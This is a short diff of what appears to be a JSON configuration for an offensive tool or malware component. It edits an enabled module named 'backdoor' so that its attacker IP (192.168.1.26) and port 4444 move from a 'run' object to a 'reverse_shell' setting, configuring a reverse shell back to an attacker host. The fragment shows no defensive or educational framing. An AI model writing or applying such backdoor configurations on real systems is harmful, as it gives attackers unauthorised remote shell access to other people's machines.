@@ -29,10 +29,7 @@
       "name": "backdoor",
       "enabled": true,
       "functions": {
-        "run": {
-          "attacker_ip": "192.168.1.26",
-          "attacker_port": 4444
-        }
+        "reverse_shell": ["192.168.1.26", 4444]
       }
     }
   ]
